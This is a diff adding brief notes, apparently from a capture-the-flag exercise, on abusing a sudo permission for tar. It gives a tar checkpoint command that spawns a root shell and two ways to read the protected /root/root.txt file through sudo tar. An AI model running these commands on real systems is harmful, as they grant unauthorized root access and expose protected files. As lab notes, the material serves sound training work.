@@ -1,0 +1,23 @@
+sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+
+
+--checkpoint=1: Tells tar to trigger an action after processing one file.
+--checkpoint-action=exec=/bin/sh: Executes a shell when the checkpoint is reached.
+
+-----------------------------------------------------------------------------------
+
+Read the root.txt file
+
+sudo tar cf - /root/root.txt | tar xf - -O
+
+
+    cf -: Creates an archive and sends it to standard output.
+    xf - -O: Immediately extracts that archive from standard input and prints the content to the screen.
+
+--------------------------------------------------------------------------------------------------------------
+
+manual Way
+
+Create the archive:   sudo tar -cvf /tmp/flag.tar /root/root.txt
+Extract it:           tar -xvf /tmp/flag.tar -C /tmp/
+Read the flag:        cat /tmp/root/root.txt 
